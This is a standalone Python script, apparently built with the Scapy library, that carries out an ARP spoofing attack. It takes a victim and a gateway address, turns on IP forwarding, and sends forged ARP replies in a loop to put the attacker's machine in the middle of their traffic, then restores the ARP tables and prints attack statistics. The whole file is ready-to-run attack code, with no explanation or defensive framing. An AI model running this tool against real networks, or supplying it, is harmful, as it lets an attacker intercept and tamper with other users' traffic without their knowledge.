#!/usr/bin/env python3

from scapy.all import ARP, send, get_if_hwaddr
import time
import argparse
import subprocess

def get_mac(ip, iface):
    # Use ARP who-has to get MAC address for given IP on interface
    from scapy.all import srp, Ether
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
    return ans[0][1].hwsrc if ans else None

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack Improved")
    parser.add_argument("--victim", required=True)
    parser.add_argument("--gateway", required=True)
    parser.add_argument("--duration", type=int, required=True)
    parser.add_argument("--interface", required=True)
    args = parser.parse_args()

    victim_ip = args.victim
    gateway_ip = args.gateway
    iface = args.interface
    duration = args.duration

    victim_mac = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    attacker_mac = get_if_hwaddr(iface)

    print(f"[+] Victim MAC: {victim_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print(f"[+] Attacker MAC: {attacker_mac}")

    # Enable IP forwarding (as root)
    print("[*] Enabling IP forwarding on attacker...")
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
        print("[*] IP forwarding enabled.")
    except Exception as e:
        print(f"[!] Error enabling IP forwarding: {e}")

    start = time.time()
    packet_pairs = 0
    total_packets = 0

    print("[*] Starting ARP spoofing...")
    try:
        while time.time() - start < duration:
            send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=attacker_mac), iface=iface, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=attacker_mac), iface=iface, verbose=False)
            packet_pairs += 1
            total_packets += 2
            elapsed = int(time.time() - start)
            print(f"[+] Pairs: {packet_pairs} | Total: {total_packets} | Elapsed: {elapsed}s")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Interrupted! Cleaning up...")
    finally:
        # Restore ARP
        print("[*] Restoring ARP...")
        for _ in range(5):
            send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=iface, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), iface=iface, verbose=False)
        
        # Disable IP forwarding
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0\n')
            print("[*] IP forwarding disabled.")
        except Exception as e:
            print(f"[!] Error disabling IP forwarding: {e}")

        elapsed = int(time.time() - start)
        print("\n[*] Attack Statistics:")
        print(f"    Packet pairs sent: {packet_pairs}")
        print(f"    Total ARP packets: {total_packets}")
        print(f"    Duration: {elapsed} seconds")
        if packet_pairs > 0:
            print(f"    Average interval: {elapsed / packet_pairs:.2f}s")
            print(f"    Packets/second: {total_packets / elapsed:.2f}")
        print("="*60)

if __name__ == "__main__":
    main()
